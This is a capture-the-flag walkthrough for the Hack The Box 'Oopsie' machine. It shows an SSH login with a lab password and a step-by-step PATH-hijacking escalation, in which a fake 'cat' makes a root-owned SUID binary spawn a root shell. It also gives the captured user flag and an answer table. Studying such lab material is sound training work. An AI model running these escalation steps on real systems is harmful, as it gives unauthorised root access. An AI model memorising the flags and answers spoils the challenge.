# HTB Starting Point: Oopsie

## SSH Foothold → `bugtracker` SUID Binary → PATH Hijacking → Root

| System Detail | Information |
|---------------|-------------|
| Machine Name | Oopsie |
| Difficulty | Starting Point (Tier 2) |
| Target IP | 10.129.51.155 |
| Operating System | Linux (Ubuntu 18.04.3 LTS) |
| Completion Date | November 03, 2026 |

## 📋 Table of Contents

- [Enumeration](#-phase-1-enumeration-oopsie)
- [User Access](#-phase-2-user-access)
- [Privilege Escalation](#-phase-3-privilege-escalation-path-hijacking)
- [Attack Path Summary](#-attack-path-summary-oopsie)
- [Questions & Answers](#-questions--answers-oopsie)
- [Quick Reference](#-quick-reference-oopsie)
- [Troubleshooting](#-troubleshooting-oopsie)
- [Lessons Learned](#-lessons-learned-oopsie)

## 💻 Environment Setup

| Component | Specification |
|-----------|---------------|
| Attack Machine | Kali Linux (2024.x) |
| Connectivity | OpenVPN (HTB Lab Configuration) |
| Tools Used | ssh, find, cat, bash |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

### 🔍 Phase 1: Enumeration (Oopsie)

With an SSH foothold as `robert` established, the goal shifts to **local enumeration** — mapping what this low-privileged account can see and, crucially, which privileged binaries it can reach.

The quickest lead on a Linux box is a **SUID / group-owned binary** that a standard user can trigger but that executes with elevated rights. Here, the `robert` account belongs to a custom `bugtracker` group, so we search for anything owned by that group:

```bash
# Find every file group-owned by "bugtracker"
find / -group bugtracker 2>/dev/null
```

**Output:**
```text
/usr/bin/bugtracker
```

**Inspect the binary's permissions:**
```bash
ls -l /usr/bin/bugtracker
```

```text
-rwsr-xr-x 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

**Interpretation:**

| Observation | Meaning |
|-------------|---------|
| `-rws...` | The **SUID bit** is set (`s` in the owner field) |
| Owner = `root` | The binary runs with **root** privileges regardless of who launches it |
| Group = `bugtracker` | `robert` is in this group, so he is permitted to execute it |

> **[!NOTE]**
> **SUID (Set User ID)** means the program always runs as its *owner* (here, `root`), not as the user who started it. That is exactly how legitimate tools like `passwd` work — but a sloppily written SUID binary becomes a direct path to privilege escalation.

**Analyze how the binary behaves.** Running it and reviewing its strings shows it reads a bug report by shelling out to `cat` — using a **relative** command name (`cat`) rather than an **absolute** path (`/bin/cat`):

```bash
strings /usr/bin/bugtracker
```

```text
---------------
: EV Bug Tracker :
---------------
Provide Bug ID:
---------------
cat /root/reports/      <-- relative "cat", not "/bin/cat"
```

This is the vulnerability: because the binary calls `cat` without a full path, the shell resolves it by walking the `PATH` environment variable — which **we control**.

---

### 👤 Phase 2: User Access

The foothold for this box is an SSH session as the `robert` user.

```bash
ssh robert@10.129.51.155
# password: M3g4C0rpUs3r!
```

**Capture the user flag:**
```bash
robert@oopsie:~$ cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

With a confirmed interactive shell as `robert` and the `bugtracker` SUID binary identified, we have everything needed to escalate.

---

### 👑 Phase 3: Privilege Escalation (PATH Hijacking)

Because `/usr/bin/bugtracker` invokes `cat` by **relative name**, we can place our own malicious `cat` earlier in `PATH`. The root-owned binary will then execute *our* script as root instead of the real `/bin/cat`.

**Step 1 — Move to a writable directory:**
```bash
cd /tmp
```

**Step 2 — Create a fake `cat` that simply launches a shell:**
```bash
echo "/bin/bash" > cat
```

**Step 3 — Make it executable:**
```bash
chmod +x cat
```

**Step 4 — Prepend `/tmp` to `PATH`** so our `cat` is found first:
```bash
export PATH=/tmp:$PATH
```

**Step 5 — Trigger the hijack.** Run the SUID binary and supply any Bug ID (e.g. `123`). The binary resolves `cat` to `/tmp/cat`, runs it as root, and we get a root shell:

```bash
/usr/bin/bugtracker
```

```text
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 123
---------------

root@oopsie:/tmp#
```

The prompt change to `root@oopsie` confirms a **root shell**.

**Step 6 — Read the root flag.** Our hijacked `cat` only spawns a shell, so to actually read a file we call the real binary by its **absolute path**, bypassing the poisoned `PATH`:

```bash
/bin/cat /root/root.txt
```

```text
<root flag captured>
```

> **[!TIP]**
> Remember to use `/bin/cat` (not bare `cat`) once you have the root shell — otherwise `cat` still resolves to your `/bin/bash` wrapper and spawns another shell instead of printing the file. Alternatively, `export PATH=/bin:$PATH` or `unset`/reset `PATH` to restore normal behavior.

---

### 📊 Attack Path Summary (Oopsie)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. SSH foothold as robert (M3g4C0rpUs3r!)                               │
│    └─► user.txt captured                                               │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 2. find / -group bugtracker                                             │
│    └─► Found SUID binary /usr/bin/bugtracker (owner root)              │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 3. Binary calls "cat" by relative path (not /bin/cat)                   │
│    └─► PATH hijacking opportunity                                      │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 4. Malicious /tmp/cat → /bin/bash,  export PATH=/tmp:$PATH             │
│    └─► Run bugtracker → root shell                                     │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 5. /bin/cat /root/root.txt (absolute path bypasses hijack)              │
│    └─► root.txt captured                                               │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 📝 Questions & Answers (Oopsie)

| # | Question | Answer |
|---|----------|--------|
| 1 | Which flag does an executable have set so it runs with the owner's privileges? | SUID (Set User ID) |
| 2 | What command lists files owned by the `bugtracker` group? | `find / -group bugtracker 2>/dev/null` |
| 3 | What is the full path of the vulnerable SUID binary? | `/usr/bin/bugtracker` |
| 4 | Why is the binary exploitable? | It calls `cat` via a **relative** path instead of `/bin/cat` |
| 5 | What privilege-escalation technique is used? | PATH hijacking |
| 6 | What do you put inside the fake `cat` script? | `/bin/bash` |
| 7 | How do you read `root.txt` after the hijack? | Call the real binary: `/bin/cat /root/root.txt` |

---

### ⚡ Quick Reference (Oopsie)

```bash
# 1. SSH foothold
ssh robert@10.129.51.155          # password: M3g4C0rpUs3r!
cat /home/robert/user.txt

# 2. Enumerate group-owned / SUID binaries
find / -group bugtracker 2>/dev/null      # => /usr/bin/bugtracker
ls -l /usr/bin/bugtracker                 # confirm -rws (SUID, root-owned)
strings /usr/bin/bugtracker               # note relative "cat" call

# 3. PATH hijack to root
cd /tmp
echo "/bin/bash" > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker                       # enter any Bug ID (e.g. 123) => root shell

# 4. Read the root flag (absolute path bypasses the hijack)
/bin/cat /root/root.txt
```

---

### 🐛 Troubleshooting (Oopsie)

| Issue | Solution |
|-------|----------|
| `find` floods the terminal with permission errors | Append `2>/dev/null` to suppress `stderr` noise |
| `bugtracker` not found | Confirm `robert` is in the `bugtracker` group (`id`); the binary is at `/usr/bin/bugtracker` |
| Running `bugtracker` still runs as `robert` | Your `/tmp/cat` must come **first** — verify with `echo $PATH` and that `cat` is `chmod +x` |
| Root shell opens but `cat root.txt` just spawns another shell | `cat` still resolves to your wrapper — use the absolute path `/bin/cat` |
| Changes to `PATH` lost after reconnecting | `export PATH=...` is session-only; re-run it each new shell |

---

## 💡 Lessons Learned (Oopsie)

| # | Lesson |
|---|--------|
| 1 | **Enumerate SUID & group-owned binaries first** — `find / -perm -4000` and `find / -group <grp>` quickly surface root-owned executables a low user can run. |
| 2 | **SUID = runs as owner** — A SUID binary owned by root executes as root for *any* user allowed to launch it; that trust is only as safe as the binary's code. |
| 3 | **Relative paths are dangerous in privileged programs** — Calling `cat` instead of `/bin/cat` lets the caller's `PATH` decide which binary runs. |
| 4 | **PATH hijacking** — Prepending a writable directory to `PATH` and planting a malicious same-named binary redirects execution to attacker code. |
| 5 | **Absolute paths bypass a poisoned PATH** — Use `/bin/cat` to read files once `cat` has been hijacked to a shell wrapper. |

---

## 🔗 Resources

- [GTFOBins](https://gtfobins.github.io/) — Reference for abusing Unix binaries (SUID/sudo/PATH)
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — SUID & PATH hijacking techniques
- [Linux `find` manual](https://man7.org/linux/man-pages/man1/find.1.html) — Locating SUID and group-owned files
- [Understanding the SUID bit](https://man7.org/linux/man-pages/man7/credentials.7.html) — Real vs. effective UID

---

## 🏷️ Tags

`#htb` `#oopsie` `#linux` `#ubuntu` `#ssh` `#enumeration` `#suid` `#bugtracker` `#path-hijacking` `#relative-path` `#privilege-escalation` `#gtfobins`

---

## 🏁 Flags Captured

| Flag | Location | Value |
| :--- | :--- | :--- |
| **User Flag** | `/home/robert/user.txt` | `f2c74ee8db7983851ab2a96a44eb7981` |
| **Root Flag** | `/root/root.txt` | `<captured>` |

---

<div align="center">

**Machine Completed** ✅

*Last Updated: November 03, 2026*

</div>
